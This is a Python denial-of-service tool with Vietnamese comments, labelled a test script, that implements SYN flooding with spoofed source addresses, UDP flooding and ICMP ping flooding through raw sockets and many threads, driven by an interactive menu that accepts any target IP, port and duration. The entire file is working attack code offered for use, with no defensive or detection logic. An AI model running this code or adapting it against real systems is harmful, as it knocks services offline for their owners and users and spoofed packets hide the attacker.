#!/usr/bin/env python3
"""
Script để test tấn công DDoS đơn giản
"""

import socket
import threading
import time
import random
import struct

def syn_flood(target_ip, target_port, duration=10):
    """Tấn công SYN Flood"""
    print(f"Starting SYN Flood attack on {target_ip}:{target_port} for {duration} seconds")
    
    def send_syn():
        try:
            # Tạo socket raw
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Tạo IP header
            source_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
            
            # IP header
            ip_version = 4
            ip_ihl = 5
            ip_tos = 0
            ip_tot_len = 40
            ip_id = random.randint(1, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_TCP
            ip_check = 0
            ip_saddr = socket.inet_aton(source_ip)
            ip_daddr = socket.inet_aton(target_ip)
            
            ip_header = struct.pack('!BBHHHBBH4s4s',
                (ip_version << 4) + ip_ihl, ip_tos, ip_tot_len, ip_id,
                ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
            
            # TCP header
            source_port = random.randint(1024, 65535)
            seq = random.randint(1, 4294967295)
            ack_seq = 0
            tcp_doff = 5
            tcp_fin = 0
            tcp_syn = 1
            tcp_rst = 0
            tcp_psh = 0
            tcp_ack = 0
            tcp_urg = 0
            tcp_window = socket.htons(5840)
            tcp_check = 0
            tcp_urg_ptr = 0
            
            tcp_offset_res = (tcp_doff << 4) + 0
            tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + \
                       (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
            
            tcp_header = struct.pack('!HHLLBBHHH',
                source_port, target_port, seq, ack_seq,
                tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
            
            packet = ip_header + tcp_header
            s.sendto(packet, (target_ip, 0))
            
        except Exception as e:
            print(f"Error sending SYN packet: {e}")
    
    start_time = time.time()
    packet_count = 0
    
    while time.time() - start_time < duration:
        for _ in range(10):  # Gửi 10 packet mỗi lần
            threading.Thread(target=send_syn).start()
            packet_count += 1
        time.sleep(0.01)  # Delay nhỏ
    
    print(f"SYN Flood completed. Sent approximately {packet_count} packets")

def udp_flood(target_ip, target_port, duration=10):
    """Tấn công UDP Flood"""
    print(f"Starting UDP Flood attack on {target_ip}:{target_port} for {duration} seconds")
    
    def send_udp():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 1024  # 1KB data
            s.sendto(data, (target_ip, target_port))
            s.close()
        except Exception as e:
            print(f"Error sending UDP packet: {e}")
    
    start_time = time.time()
    packet_count = 0
    
    while time.time() - start_time < duration:
        for _ in range(20):  # Gửi 20 packet mỗi lần
            threading.Thread(target=send_udp).start()
            packet_count += 1
        time.sleep(0.01)
    
    print(f"UDP Flood completed. Sent approximately {packet_count} packets")

def icmp_flood(target_ip, duration=10):
    """Tấn công ICMP Flood (Ping Flood)"""
    print(f"Starting ICMP Flood attack on {target_ip} for {duration} seconds")
    
    def send_icmp():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # ICMP header
            icmp_type = 8  # Echo request
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = random.randint(1, 65535)
            icmp_seq = random.randint(1, 65535)
            
            icmp_header = struct.pack('!BBHHH',
                icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            
            # Data
            data = b"X" * 56
            
            packet = icmp_header + data
            s.sendto(packet, (target_ip, 0))
            
        except Exception as e:
            print(f"Error sending ICMP packet: {e}")
    
    start_time = time.time()
    packet_count = 0
    
    while time.time() - start_time < duration:
        for _ in range(15):  # Gửi 15 packet mỗi lần
            threading.Thread(target=send_icmp).start()
            packet_count += 1
        time.sleep(0.01)
    
    print(f"ICMP Flood completed. Sent approximately {packet_count} packets")

def main():
    print("DDoS Attack Test Tool")
    print("=" * 50)
    
    # Lấy IP đích
    target_ip = input("Enter target IP (default: 127.0.0.1): ").strip()
    if not target_ip:
        target_ip = "127.0.0.1"
    
    # Lấy port đích
    try:
        target_port = int(input("Enter target port (default: 80): ").strip() or "80")
    except ValueError:
        target_port = 80
    
    # Lấy thời gian tấn công
    try:
        duration = int(input("Enter attack duration in seconds (default: 10): ").strip() or "10")
    except ValueError:
        duration = 10
    
    print(f"\nTarget: {target_ip}:{target_port}")
    print(f"Duration: {duration} seconds")
    print("\nChoose attack type:")
    print("1. SYN Flood")
    print("2. UDP Flood") 
    print("3. ICMP Flood")
    print("4. All attacks")
    
    choice = input("Enter choice (1-4): ").strip()
    
    print(f"\nStarting attack in 3 seconds...")
    time.sleep(3)
    
    if choice == "1":
        syn_flood(target_ip, target_port, duration)
    elif choice == "2":
        udp_flood(target_ip, target_port, duration)
    elif choice == "3":
        icmp_flood(target_ip, duration)
    elif choice == "4":
        print("Running all attacks...")
        threads = []
        threads.append(threading.Thread(target=syn_flood, args=(target_ip, target_port, duration)))
        threads.append(threading.Thread(target=udp_flood, args=(target_ip, target_port, duration)))
        threads.append(threading.Thread(target=icmp_flood, args=(target_ip, duration)))
        
        for t in threads:
            t.start()
        
        for t in threads:
            t.join()
    else:
        print("Invalid choice. Running SYN Flood...")
        syn_flood(target_ip, target_port, duration)
    
    print("\nAttack completed!")

if __name__ == "__main__":
    main() 